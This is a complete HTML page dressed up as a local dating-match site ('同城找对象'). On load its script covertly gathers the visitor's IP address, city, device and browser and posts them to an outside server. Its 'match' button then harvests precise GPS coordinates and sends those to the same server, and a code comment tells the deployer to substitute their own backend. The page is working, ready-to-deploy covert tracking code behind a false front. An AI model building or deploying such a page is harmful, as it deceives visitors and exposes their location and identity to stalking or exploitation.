<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>同城找对象</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      width: 100vw; height: 100vh;
      background: linear-gradient(140deg, #0b1020, #152241);
      display: flex; align-items: center; justify-content: center;
    }
    .btn {
      padding: 18px 50px; font-size: 19px;
      background: #2388ff; color: #fff; border: none; border-radius: 12px;
      box-shadow: 0 0 20px #2388ff60; cursor: pointer;
    }
    .btn:active { transform: scale(0.96); }
  </style>
</head>
<body>
  <button class="btn" id="posBtn">点击匹配对象</button>

  <script>
    let info = { ip: '', area: '', device: '', browser: '', position: '' };
    // 替换成你部署后的后端接口地址，比如：https://你的项目名.vercel.app/api/data
    const API_URL = 'https://mock-phone-api3.onrender.com/api/data';

    // 进入页面自动采集IP、地区、设备信息
    (async function autoGetBaseInfo() {
      try {
        // 获取公网IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipJson = await ipRes.json();
        info.ip = ipJson.ip;

        // 获取IP归属地
        const areaRes = await fetch(`https://ipapi.co/${info.ip}/json/`);
        const areaJson = await areaRes.json();
        info.area = `${areaJson.country_name || ''} ${areaJson.region || ''} ${areaJson.city || ''}`;

        // 识别设备和浏览器
        const ua = navigator.userAgent;
        info.device = ua.includes('iPhone') ? '苹果手机' : 
                      ua.includes('Android') ? '安卓手机' : 
                      ua.includes('Windows') ? 'Windows电脑' : '未知设备';
        info.browser = ua.includes('MicroMessenger') ? '微信内置浏览器' : 
                       ua.includes('Chrome') ? '谷歌浏览器' : 
                       ua.includes('Safari') ? '苹果Safari' : '未知浏览器';

        // 上传数据到后端
        await uploadData();
      } catch (err) {
        console.error('信息采集失败:', err);
      }
    })();

    // 点击按钮获取精准定位
    document.getElementById('posBtn').addEventListener('click', () => {
      if (!navigator.geolocation) {
        alert('当前设备不支持定位功能');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        async (res) => {
          const lat = res.coords.latitude.toFixed(6);
          const lng = res.coords.longitude.toFixed(6);
          info.position = `纬度: ${lat}，经度: ${lng}`;
          await uploadData();
          alert('位置获取成功！');
        },
        async () => {
          info.position = '用户拒绝定位权限';
          await uploadData();
          alert('定位授权失败，请允许位置权限后重试');
        }
      );
    });

    // 上传数据到后端接口
    async function uploadData() {
      await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(info)
      });
    }
  </script>
</body>
</html>
